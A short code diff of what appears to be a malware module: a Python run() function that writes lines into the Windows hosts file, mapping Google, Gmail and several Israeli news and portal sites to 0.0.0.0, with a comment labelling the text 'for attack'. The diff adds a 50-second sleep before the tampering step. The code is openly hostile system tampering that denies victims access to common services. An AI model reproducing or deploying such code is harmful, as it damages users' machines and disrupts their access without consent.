@@ -2,6 +2,7 @@ import time
 def run(**args):
     #"0.0.0.0 www.github.com\n"\
     #text for to add to file for attack
+    time.sleep(50)
     dns_attack_text = "\n"\
     "0.0.0.0 www.google.com\n"\
     "0.0.0.0 www.google.co.il\n"\
@@ -37,7 +38,7 @@ def run(**args):
     "0.0.0.0 www.mako.co.il\n"\
     "0.0.0.0 www.nana10.co.il\n"\
     "0.0.0.0 mail.google.com\n"
-     
+    
     try:
         fr = open("C:\Windows\System32\drivers\etc\hosts", "r+")
     #got hosts file
